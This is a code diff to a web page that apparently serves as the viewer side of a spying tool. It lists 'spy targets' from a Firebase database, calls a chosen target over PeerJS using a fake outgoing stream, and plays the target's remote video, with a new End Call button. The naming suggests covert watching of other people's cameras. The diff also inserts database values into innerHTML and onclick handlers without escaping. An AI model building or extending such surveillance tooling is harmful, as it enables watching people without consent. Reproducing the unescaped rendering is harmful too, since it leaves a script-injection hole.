@@ -14,6 +14,10 @@
 <body>
     <video id="video" controls autoplay></video>
 
+    <button id="btn-endcall">End Call</button>
+
+    <ul id="list-spy-targets"></ul>
+
     <script>
         // https://github.com/peers/peerjs/issues/158#issuecomment-614779167
         const createMediaStreamFake = () => {
@@ -53,31 +57,31 @@
         };
     </script>
 
-    <script>
+    <script type="module">
+        import { onSpyTargetsPeerIDChanged, onValue, spyTargetsRef } from './firebase.js';
+
+        onValue(spyTargetsRef, (snapshot) => {
+            const data = snapshot.val();
+
+            console.log(data);
+
+            const ul = document.querySelector("#list-spy-targets");
+            ul.innerHTML = data ? Object.keys(data).map(peerid => `<li>
+                ${data[peerid].name}
+                <button onclick="call('${peerid}')">Call</button>
+            </li>`).join('') : "";
+        });
+
         var videoEle = document.querySelector("#video");
+        var btnEndCall = document.querySelector("#btn-endcall");
 
         var peer = new Peer();
-
-        Swal.fire({
-            title: "Welcome",
-            text: "Enter target peer id",
-            input: 'text',
-            confirmButtonText: 'Connect',
-            allowOutsideClick: false,
-            allowEscapeKey: false,
-            inputValidator: (value) => {
-                if (!value) {
-                    return 'You need to input peerid of target'
-                }
-            }
-        }).then((result) => {
-            call(result.value);
-        })
+        var currentCall;
 
         function call(peerid) {
-            var conn = peer.connect(peerid);
+            currentCall = peer.connect(peerid);
 
-            conn.on('open', function () {
+            currentCall.on('open', function () {
                 console.log('Connected to: ' + peerid);
 
                 var call = peer.call(peerid, createMediaStreamFake());
@@ -86,6 +90,18 @@
                     videoEle.srcObject = remoteStream;
                 });
             });
+        }
+
+        function endCall() {
+            currentCall.close();
+            currentCall = null;
+            videoEle.srcObject = null;
+        }
+
+        window.onload = () => {
+            window.call = call;
+
+            btnEndCall.addEventListener('click', endCall);
         }
     </script>
 </body>
